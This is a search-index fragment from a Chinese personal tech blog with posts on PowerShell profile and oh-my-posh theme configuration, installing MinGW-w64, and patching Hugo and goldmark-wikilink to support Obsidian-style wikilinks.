","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:2","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#命令查询"},{"categories":["blog"],"content":" 常用配置 $profile 配置 不想用主题了…安装 oh-my-post: winget install JanDeDobbeleer.OhMyPosh -s winget 编辑配置文件 notepad $profile 或者 code $profile 贴入配置文件 # 不想用主题了... # 主题配置,主题列表 https://ohmyposh.dev/docs/themes # oh-my-posh init pwsh --config \"D:\\OneDrive\\kentxxq\\config\\oh-my-posh\\theme.json\" | Invoke-Expression # vpn命令 function vpn { $Env:all_proxy = \"http://127.0.0.1:7890\"; } # function vpn { # $Env:http_proxy = \"http://127.0.0.1:7890\"; $Env:https_proxy = \"http://127.0.0.1:7890\"; # } function novpn { $Env:all_proxy = \"\"; } # function novpn { # $Env:http_proxy = \"\"; $Env:https_proxy = \"\"; # } # 重新加载环境变量 function reload { $env:Path = [System.Environment]::GetEnvironmentVariable(\"Path\", \"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\", \"User\") } # 默认启用vpn vpn # 配合ssh-agent使用 $env:GIT_SSH = \"C:\\Windows\\System32\\OpenSSH\\ssh.exe\" # fnm源 Set-Variable FNM_NODE_DIST_MIRROR https://mirrors.ivolces.com/nodejs-release/ # fnm启用 fnm env --use-on-cd | Out-String | Invoke-Expression 主题文件 { \"$schema\": \"https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json\", \"blocks\": [ { \"alignment\": \"left\", \"newline\": true, \"segments\": [ { \"background\": \"#d75f00\", \"foreground\": \"#f2f3f8\", \"properties\": { \"alpine\": \"\\uf300\", \"arch\": \"\\uf303\", \"centos\": \"\\uf304\", \"debian\": \"\\uf306\", \"elementary\": \"\\uf309\", \"fedora\": \"\\uf30a\", \"gentoo\": \"\\uf30d\", \"linux\": \"\\ue712\", \"macos\": \"\\ue711\", \"manjaro\": \"\\uf312\", \"mint\": \"\\uf30f\", \"opensuse\": \"\\uf314\", \"raspbian\": \"\\uf315\", \"ubuntu\": \"\\uf31c\", \"windows\": \"\\ue70f\" }, \"style\": \"diamond\", \"leading_diamond\": \"\\u256d\\u2500\\ue0b2\", \"template\": \" {{ .Icon }} \", \"type\": \"os\" }, { \"background\": \"#e4e4e4\", \"foreground\": \"#4e4e4e\", \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b0\", \"template\": \" {{ .UserName }}@{{ .HostName }} \", \"type\": \"session\" }, { \"background\": \"#0087af\", \"foreground\": \"#f2f3f8\", \"properties\": { \"style\": \"full\", \"max_depth\": 3, \"folder_icon\": \"\\u2026\" // \"folder_separator_icon\": \" \u003ctransparent\u003e\\ue0b1\u003c/\u003e \" }, \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b0\", \"template\": \" \\ue5ff {{ .Path }} \", \"type\": \"path\" }, { \"background\": \"#378504\", \"foreground\": \"#f2f3f8\", \"background_templates\": [ \"{{ if or (.Working.Changed) (.Staging.Changed) }}#a97400{{ end }}\", \"{{ if and (gt .Ahead 0) (gt .Behind 0) }}#54433a{{ end }}\", \"{{ if gt .Ahead 0 }}#744d89{{ end }}\", \"{{ if gt .Behind 0 }}#744d89{{ end }}\" ], \"properties\": { \"branch_max_length\": 25, \"fetch_stash_count\": true, \"fetch_status\": true, \"branch_icon\": \"\\uf418 \", \"branch_identical_icon\": \"\\uf444\", \"branch_gone_icon\": \"\\uf655\" }, \"style\": \"diamond\", \"leading_diamond\": \"\u003ctransparent,background\u003e\\ue0b0\u003c/\u003e\", \"template\": \" {{ .HEAD }}{{if .BranchStatus }} {{ .BranchStatus }}{{ end }}{{ if .Working.Changed }} \u003ctransparent\u003e\\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf044 {{ .Working.String }}\u003c/\u003e{{ end }}{{ if .Staging.Changed }} \u003ctransparent\u003e\\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf046 {{ .Staging.String }}\u003c/\u003e{{ end }}{{ if gt .StashCount 0 }} \u003ctransparent\u003e\\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf692 {{ .StashCount }}\u003c/\u003e{{ end }} \", \"trailing_diamond\": \"\\ue0b0\", \"type\": \"git\" } // , // { // \"type\": \"dotnet\", // \"style\": \"powerline\", // \"powerline_symbol\": \"\\uE0B0\", // \"foreground\": \"#000000\", // \"background\": \"#00ffff\", // \"template\": \" \\uE77F {{ .Full }} \" // } ], \"type\": \"prompt\" }, { \"alignment\": \"right\", \"segments\": [ { \"background\": \"#e4e4e4\", \"foreground\": \"#585858\", \"properties\": { \"style\": \"austin\", \"always_enabled\": true }, \"invert_powerline\": true, \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b2\", \"template\": \" \\uf608 {{ .FormattedMs }} \", \"type\": \"executiontime\" }, { \"background\": \"#d75f00\", \"foreground\": \"#f2f3f8\", \"properties\": { \"time_format\": \"15:04:05\" }, \"invert_powerline\": true, \"style\": \"diamond\", \"template\": \" \\uf5ef {{ .CurrentDate | date .Format }} \", // \"trailing_diamond\": \"\\ue0b0\", \"type\": \"time\" }, { \"type\": \"exit\", \"style\": \"diamond\", \"foreground\": \"#ffffff\", \"background\": \"#00897b\", // \"invert_powerline\": true, \"powerline_symbol\": \"\\ue0b2\", \"background_templates\":","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#常用配置"},{"categories":["blog"],"content":" 常用配置 $profile 配置 不想用主题了…安装 oh-my-post: winget install JanDeDobbeleer.OhMyPosh -s winget 编辑配置文件 notepad $profile 或者 code $profile 贴入配置文件 # 不想用主题了... # 主题配置,主题列表 https://ohmyposh.dev/docs/themes # oh-my-posh init pwsh --config \"D:\\OneDrive\\kentxxq\\config\\oh-my-posh\\theme.json\" | Invoke-Expression # vpn命令 function vpn { $Env:all_proxy = \"http://127.0.0.1:7890\"; } # function vpn { # $Env:http_proxy = \"http://127.0.0.1:7890\"; $Env:https_proxy = \"http://127.0.0.1:7890\"; # } function novpn { $Env:all_proxy = \"\"; } # function novpn { # $Env:http_proxy = \"\"; $Env:https_proxy = \"\"; # } # 重新加载环境变量 function reload { $env:Path = [System.Environment]::GetEnvironmentVariable(\"Path\", \"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\", \"User\") } # 默认启用vpn vpn # 配合ssh-agent使用 $env:GIT_SSH = \"C:\\Windows\\System32\\OpenSSH\\ssh.exe\" # fnm源 Set-Variable FNM_NODE_DIST_MIRROR https://mirrors.ivolces.com/nodejs-release/ # fnm启用 fnm env --use-on-cd | Out-String | Invoke-Expression 主题文件 { \"$schema\": \"https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json\", \"blocks\": [ { \"alignment\": \"left\", \"newline\": true, \"segments\": [ { \"background\": \"#d75f00\", \"foreground\": \"#f2f3f8\", \"properties\": { \"alpine\": \"\\uf300\", \"arch\": \"\\uf303\", \"centos\": \"\\uf304\", \"debian\": \"\\uf306\", \"elementary\": \"\\uf309\", \"fedora\": \"\\uf30a\", \"gentoo\": \"\\uf30d\", \"linux\": \"\\ue712\", \"macos\": \"\\ue711\", \"manjaro\": \"\\uf312\", \"mint\": \"\\uf30f\", \"opensuse\": \"\\uf314\", \"raspbian\": \"\\uf315\", \"ubuntu\": \"\\uf31c\", \"windows\": \"\\ue70f\" }, \"style\": \"diamond\", \"leading_diamond\": \"\\u256d\\u2500\\ue0b2\", \"template\": \" {{ .Icon }} \", \"type\": \"os\" }, { \"background\": \"#e4e4e4\", \"foreground\": \"#4e4e4e\", \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b0\", \"template\": \" {{ .UserName }}@{{ .HostName }} \", \"type\": \"session\" }, { \"background\": \"#0087af\", \"foreground\": \"#f2f3f8\", \"properties\": { \"style\": \"full\", \"max_depth\": 3, \"folder_icon\": \"\\u2026\" // \"folder_separator_icon\": \" \\ue0b1\u003c/\u003e \" }, \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b0\", \"template\": \" \\ue5ff {{ .Path }} \", \"type\": \"path\" }, { \"background\": \"#378504\", \"foreground\": \"#f2f3f8\", \"background_templates\": [ \"{{ if or (.Working.Changed) (.Staging.Changed) }}#a97400{{ end }}\", \"{{ if and (gt .Ahead 0) (gt .Behind 0) }}#54433a{{ end }}\", \"{{ if gt .Ahead 0 }}#744d89{{ end }}\", \"{{ if gt .Behind 0 }}#744d89{{ end }}\" ], \"properties\": { \"branch_max_length\": 25, \"fetch_stash_count\": true, \"fetch_status\": true, \"branch_icon\": \"\\uf418 \", \"branch_identical_icon\": \"\\uf444\", \"branch_gone_icon\": \"\\uf655\" }, \"style\": \"diamond\", \"leading_diamond\": \"\\ue0b0\u003c/\u003e\", \"template\": \" {{ .HEAD }}{{if .BranchStatus }} {{ .BranchStatus }}{{ end }}{{ if .Working.Changed }} \\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf044 {{ .Working.String }}\u003c/\u003e{{ end }}{{ if .Staging.Changed }} \\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf046 {{ .Staging.String }}\u003c/\u003e{{ end }}{{ if gt .StashCount 0 }} \\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf692 {{ .StashCount }}\u003c/\u003e{{ end }} \", \"trailing_diamond\": \"\\ue0b0\", \"type\": \"git\" } // , // { // \"type\": \"dotnet\", // \"style\": \"powerline\", // \"powerline_symbol\": \"\\uE0B0\", // \"foreground\": \"#000000\", // \"background\": \"#00ffff\", // \"template\": \" \\uE77F {{ .Full }} \" // } ], \"type\": \"prompt\" }, { \"alignment\": \"right\", \"segments\": [ { \"background\": \"#e4e4e4\", \"foreground\": \"#585858\", \"properties\": { \"style\": \"austin\", \"always_enabled\": true }, \"invert_powerline\": true, \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b2\", \"template\": \" \\uf608 {{ .FormattedMs }} \", \"type\": \"executiontime\" }, { \"background\": \"#d75f00\", \"foreground\": \"#f2f3f8\", \"properties\": { \"time_format\": \"15:04:05\" }, \"invert_powerline\": true, \"style\": \"diamond\", \"template\": \" \\uf5ef {{ .CurrentDate | date .Format }} \", // \"trailing_diamond\": \"\\ue0b0\", \"type\": \"time\" }, { \"type\": \"exit\", \"style\": \"diamond\", \"foreground\": \"#ffffff\", \"background\": \"#00897b\", // \"invert_powerline\": true, \"powerline_symbol\": \"\\ue0b2\", \"background_templates\":","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#profile-配置"},{"categories":["blog"],"content":" 常用配置 $profile 配置 不想用主题了…安装 oh-my-post: winget install JanDeDobbeleer.OhMyPosh -s winget 编辑配置文件 notepad $profile 或者 code $profile 贴入配置文件 # 不想用主题了... # 主题配置,主题列表 https://ohmyposh.dev/docs/themes # oh-my-posh init pwsh --config \"D:\\OneDrive\\kentxxq\\config\\oh-my-posh\\theme.json\" | Invoke-Expression # vpn命令 function vpn { $Env:all_proxy = \"http://127.0.0.1:7890\"; } # function vpn { # $Env:http_proxy = \"http://127.0.0.1:7890\"; $Env:https_proxy = \"http://127.0.0.1:7890\"; # } function novpn { $Env:all_proxy = \"\"; } # function novpn { # $Env:http_proxy = \"\"; $Env:https_proxy = \"\"; # } # 重新加载环境变量 function reload { $env:Path = [System.Environment]::GetEnvironmentVariable(\"Path\", \"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\", \"User\") } # 默认启用vpn vpn # 配合ssh-agent使用 $env:GIT_SSH = \"C:\\Windows\\System32\\OpenSSH\\ssh.exe\" # fnm源 Set-Variable FNM_NODE_DIST_MIRROR https://mirrors.ivolces.com/nodejs-release/ # fnm启用 fnm env --use-on-cd | Out-String | Invoke-Expression 主题文件 { \"$schema\": \"https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json\", \"blocks\": [ { \"alignment\": \"left\", \"newline\": true, \"segments\": [ { \"background\": \"#d75f00\", \"foreground\": \"#f2f3f8\", \"properties\": { \"alpine\": \"\\uf300\", \"arch\": \"\\uf303\", \"centos\": \"\\uf304\", \"debian\": \"\\uf306\", \"elementary\": \"\\uf309\", \"fedora\": \"\\uf30a\", \"gentoo\": \"\\uf30d\", \"linux\": \"\\ue712\", \"macos\": \"\\ue711\", \"manjaro\": \"\\uf312\", \"mint\": \"\\uf30f\", \"opensuse\": \"\\uf314\", \"raspbian\": \"\\uf315\", \"ubuntu\": \"\\uf31c\", \"windows\": \"\\ue70f\" }, \"style\": \"diamond\", \"leading_diamond\": \"\\u256d\\u2500\\ue0b2\", \"template\": \" {{ .Icon }} \", \"type\": \"os\" }, { \"background\": \"#e4e4e4\", \"foreground\": \"#4e4e4e\", \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b0\", \"template\": \" {{ .UserName }}@{{ .HostName }} \", \"type\": \"session\" }, { \"background\": \"#0087af\", \"foreground\": \"#f2f3f8\", \"properties\": { \"style\": \"full\", \"max_depth\": 3, \"folder_icon\": \"\\u2026\" // \"folder_separator_icon\": \" \\ue0b1\u003c/\u003e \" }, \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b0\", \"template\": \" \\ue5ff {{ .Path }} \", \"type\": \"path\" }, { \"background\": \"#378504\", \"foreground\": \"#f2f3f8\", \"background_templates\": [ \"{{ if or (.Working.Changed) (.Staging.Changed) }}#a97400{{ end }}\", \"{{ if and (gt .Ahead 0) (gt .Behind 0) }}#54433a{{ end }}\", \"{{ if gt .Ahead 0 }}#744d89{{ end }}\", \"{{ if gt .Behind 0 }}#744d89{{ end }}\" ], \"properties\": { \"branch_max_length\": 25, \"fetch_stash_count\": true, \"fetch_status\": true, \"branch_icon\": \"\\uf418 \", \"branch_identical_icon\": \"\\uf444\", \"branch_gone_icon\": \"\\uf655\" }, \"style\": \"diamond\", \"leading_diamond\": \"\\ue0b0\u003c/\u003e\", \"template\": \" {{ .HEAD }}{{if .BranchStatus }} {{ .BranchStatus }}{{ end }}{{ if .Working.Changed }} \\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf044 {{ .Working.String }}\u003c/\u003e{{ end }}{{ if .Staging.Changed }} \\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf046 {{ .Staging.String }}\u003c/\u003e{{ end }}{{ if gt .StashCount 0 }} \\ue0b1\u003c/\u003e \u003c#121318\u003e\\uf692 {{ .StashCount }}\u003c/\u003e{{ end }} \", \"trailing_diamond\": \"\\ue0b0\", \"type\": \"git\" } // , // { // \"type\": \"dotnet\", // \"style\": \"powerline\", // \"powerline_symbol\": \"\\uE0B0\", // \"foreground\": \"#000000\", // \"background\": \"#00ffff\", // \"template\": \" \\uE77F {{ .Full }} \" // } ], \"type\": \"prompt\" }, { \"alignment\": \"right\", \"segments\": [ { \"background\": \"#e4e4e4\", \"foreground\": \"#585858\", \"properties\": { \"style\": \"austin\", \"always_enabled\": true }, \"invert_powerline\": true, \"style\": \"powerline\", \"powerline_symbol\": \"\\ue0b2\", \"template\": \" \\uf608 {{ .FormattedMs }} \", \"type\": \"executiontime\" }, { \"background\": \"#d75f00\", \"foreground\": \"#f2f3f8\", \"properties\": { \"time_format\": \"15:04:05\" }, \"invert_powerline\": true, \"style\": \"diamond\", \"template\": \" \\uf5ef {{ .CurrentDate | date .Format }} \", // \"trailing_diamond\": \"\\ue0b0\", \"type\": \"time\" }, { \"type\": \"exit\", \"style\": \"diamond\", \"foreground\": \"#ffffff\", \"background\": \"#00897b\", // \"invert_powerline\": true, \"powerline_symbol\": \"\\ue0b2\", \"background_templates\":","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#主题文件"},{"categories":["blog"],"content":" 问题处理 wsl 的网络修复 # 需要管理员权限 netsh winsock reset 接触 powershell 的下载限制 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#问题处理"},{"categories":["blog"],"content":" 相关资源 官方参考文档 ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:0","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#相关资源"},{"categories":["blog"],"content":"快速安装 [[笔记/point/MinGW-w64|MinGW-w64]] 的方法.","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85mingw-w64/","series":null,"tags":["blog","MinGW-w64"],"title":"安装MinGW-w64","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85mingw-w64/"},{"categories":["blog"],"content":" 简介快速安装 MinGW-w64 的方法. ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85mingw-w64/:1:0","series":null,"tags":["blog","MinGW-w64"],"title":"安装MinGW-w64","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85mingw-w64/#简介"},{"categories":["blog"],"content":" 操作手册 访问 WinLibs - GCC+MinGW-w64 compiler for Windows 下载 MSVCRT runtime 解压后添加到 系统环境变量 中 测试验证 \u003e gcc --version gcc.exe (MinGW-W64 x86_64-msvcrt-posix-seh, built by Brecht Sanders) 13.1.0 Copyright (C) 2023 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. \u003e make --version GNU Make 3.81 Copyright (C) 2006 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. This program built for i386-pc-mingw32 ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85mingw-w64/:2:0","series":null,"tags":["blog","MinGW-w64"],"title":"安装MinGW-w64","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85mingw-w64/#操作手册"},{"categories":["blog"],"content":"在我决定使用 [[笔记/point/obsidian|obsidian]] 来记录笔记后, 就发现有 `wikilink` 这个东西, 它不是 [CommonMark](https://commonmark.org/) 的一部分, 所以会导致很多的工具链的不兼容. 例如 [[笔记/point/vscode|vscode]] 默认无法读取.而我选择用 [hugo](point/hugo.md) 进行站点的构建发布. 所以这篇博客就如题目所说的, 我要打通 [[笔记/point/hugo|hugo]] 和 [[笔记/point/obsidian|obsidian]] ,所以就有了这一篇文章.我搭建了一个 demo 站点, 你可以看看 [效果](https://doit-demo.kentxxq.com/).","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/"},{"categories":["blog"],"content":" 前情提要在我决定使用 obsidian 来记录笔记后, 就发现有 wikilink 这个东西, 它不是 CommonMark 的一部分, 所以会导致很多的工具链的不兼容. 例如 vscode 默认无法读取. 而我选择用 hugo 进行站点的构建发布. 所以这篇博客就如题目所说的, 我要打通 hugo 和 obsidian ,所以就有了这一篇文章.我搭建了一个 demo 站点, 你可以看看 效果. ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:1:0","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#前情提要"},{"categories":["blog"],"content":" 我做了什么","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:2:0","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#我做了什么"},{"categories":["blog"],"content":" 原理 hugo 默认使用 goldmark 进行 markdown 的渲染. goldmark 可以通过插件支持 wikilink. abhinav 的 goldmark-wikilink 这个插件与我的主题, 笔记路径, url 配置不兼容, 需要进行调整. 改 hugo 代码, 加入配置, 编译构建. 编写 github actions 发布工具. ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:2:1","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#原理"},{"categories":["blog"],"content":" 准备 goldmark-wikilink首先 fork 一份 goldmark-wikilink 代码到 我的仓库. 改动 go.mod module github.com/kentxxq/goldmark-wikilink 改动 resolver.go, 添加解析代码. 下面是伪代码, 讲一下我做了什么: // 默认解析,看起来不错 // [[Foo]] // =\u003e \"Foo.html\" // [[Foo bar]] // =\u003e \"Foo bar.html\" // [[foo/Bar]] // =\u003e \"foo/Bar.html\" // [[foo.pdf]] // =\u003e \"foo.pdf\" // [[foo.png]] // =\u003e \"foo.png\" var DefaultResolver Resolver = defaultResolver{} // hugo默认路径是/Foo/,所以我加了一个PrettyResolver解决这个问题 // 关于url的路径切换可以参考文档 https://gohugo.io/content-management/urls/#appearance // [[Foo]] // =\u003e \"Foo/\" var PrettyResolver Resolver = prettyResolver{} // 当我的obsidian笔记wikilink使用`相对于当前文件的路径`时 // /root/Foo.md url: /root/Foo/ // /root/a.md include [[Foo]] . url: /root/a/ wikilink: /root/a/Foo/ not found! // 所以我加上了RelResolver // [[Foo]] // =\u003e \"../Foo/\" worked! var RelResolver Resolver = relResolver{} // 但其实obsidian中使用这样的格式并不好看.我改成了`相对于项目根路径`后 // when i use pretty url with [[absolute path]] // /Foo.md url: /posts/Foo/ // /a.md include [[root/Foo]] . url: /posts/a/ wikilink: /posts/a/posts/Foo/ not found! // so... // [[Foo]] // =\u003e \"/root/Foo/\" worked! var RootResolver = func(b string) Resolver { return \u0026rootResolver{ base: b, } } var pretty_html = []byte(\"/\") // 相对路径就是在最前面加上../,变成请求上一级目录 var rel_head = []byte(\"../\") type relResolver struct{} func (relResolver) ResolveWikilink(n *Node) ([]byte, error) { dest := make([]byte, len(rel_head)+len(n.Target)+len(pretty_html)+len(_hash)+len(n.Fragment)) var i int if len(n.Target) \u003e 0 { i += copy(dest, rel_head) i += copy(dest[i:], n.Target) if filepath.Ext(string(n.Target)) == \"\" { i += copy(dest[i:], pretty_html) } } if len(n.Fragment) \u003e 0 { i += copy(dest[i:], _hash) i += copy(dest[i:], n.Fragment) } return dest[:i], nil } // 绝对路径就是传入前缀,然后直接加上wikilink的内容即可 type rootResolver struct { base string } func (r rootResolver) ResolveWikilink(n *Node) ([]byte, error) { dest := make([]byte, len(r.base)+len(n.Target)+len(pretty_html)+len(_hash)+len(n.Fragment)) var i int if len(n.Target) \u003e 0 { i += copy(dest, []byte(r.base)) i += copy(dest[i:], n.Target) if filepath.Ext(string(n.Target)) == \"\" { i += copy(dest[i:], pretty_html) } } if len(n.Fragment) \u003e 0 { i += copy(dest[i:], _hash) i += copy(dest[i:], n.Fragment) } return dest[:i], nil } ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:2:2","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#准备-goldmark-wikilink"},{"categories":["blog"],"content":" 改动 hugo同样 fork 一份 hugo 代码到 我的仓库. 安装依赖 go get github.com/kentxxq/goldmark-wikilink. 改动 markup/goldmark/goldmark_config/config.go,加入配置参数 type Extensions struct { Typographer Typographer Footnote bool DefinitionList bool // GitHub flavored markdown Table bool Strikethrough bool Linkify bool LinkifyProtocol string TaskList bool // 下面是我们新加的参数 // 采用那种方法解析链接? WikilinkReslover string // ROOT模式下,传入路径前缀 WikilinkRootPath string // 是否启用wikilink EnableWikilink bool } 改动 markup/goldmark/convert.go,让我们的配置和 wikilink 解析器生效. import ( \"bytes\" \"github.com/gohugoio/hugo/identity\" \"github.com/gohugoio/hugo/markup/goldmark/codeblocks\" \"github.com/gohugoio/hugo/markup/goldmark/goldmark_config\" \"github.com/gohugoio/hugo/markup/goldmark/images\" \"github.com/gohugoio/hugo/markup/goldmark/internal/extensions/attributes\" \"github.com/gohugoio/hugo/markup/goldmark/internal/render\" \"github.com/gohugoio/hugo/markup/converter\" \"github.com/gohugoio/hugo/markup/tableofcontents\" wikilink \"github.com/kentxxq/goldmark-wikilink\" //引入解析 \"github.com/yuin/goldmark\" \"github.com/yuin/goldmark/ast\" \"github.com/yuin/goldmark/extension\" \"github.com/yuin/goldmark/parser\" \"github.com/yuin/goldmark/renderer\" \"github.com/yuin/goldmark/renderer/html\" \"github.com/yuin/goldmark/text\" ) extensions = append(extensions, images.New(cfg.Parser.WrapStandAloneImageWithinParagraph)) // 加入 if mcfg.Goldmark.Extensions.EnableWikilink { switch mcfg.Goldmark.Extensions.WikilinkReslover { case \"DefaultResolver\": extensions = append(extensions, \u0026wikilink.Extender{ Resolver: wikilink.DefaultResolver, }) case \"PrettyResolver\": extensions = append(extensions, \u0026wikilink.Extender{ Resolver: wikilink.PrettyResolver, }) case \"RelResolver\": extensions = append(extensions, \u0026wikilink.Extender{ Resolver: wikilink.RelResolver, }) case \"RootResolver\": extensions = append(extensions, \u0026wikilink.Extender{ Resolver: wikilink.RootResolver(mcfg.Goldmark.Extensions.WikilinkRootPath), }) } } ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:2:3","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#改动-hugo"},{"categories":["blog"],"content":" 配置 dart-sass下载 Releases · sass/dart-sass 的对应系统版本, 我用的 dart-sass-1.63.6-windows-x64.zip.解压后配置到环境变量里. 打开终端验证效果 sass --version 1.63.6 ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:2:4","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#配置-dart-sass"},{"categories":["blog"],"content":" 开始构建代码 $GOOS=windows $GOARCH=amd64 $CGO_ENABLED=1 $CC=\"gcc\" $CXX=\"g++\" # 构建命令 # -v 详细信息 # -x 打印出执行的命令，以及相关的详细信息 # extended是加入sass,release则是hugo自定义 # `-s` 表示禁用符号表，`-w` 表示禁用 DWARF 调试信息，`-extldflags '-static'` 表示使用静态链接方式进行链接。 go build -v -x -tags extended,release -ldflags \"-s -w -extldflags '-static'\" # 文件夹多出一个hugo.exe ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:2:5","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#开始构建代码"},{"categories":["blog"],"content":" hugo 预览 # 克隆我的示例代码 git clone https://github.com/kentxxq/doit-demo.git # 注意hugo.toml文件加入了如下配置 EnableWikilink = true WikilinkRootPath = \"/posts/\" WikilinkReslover = \"RootResolver\" # 启动3333端口 cd doit-demo hugo server --disableFastRender -p 3333 访问 http://localhost:3333 看看效果吧. ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:2:6","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#hugo-预览"},{"categories":["blog"],"content":" 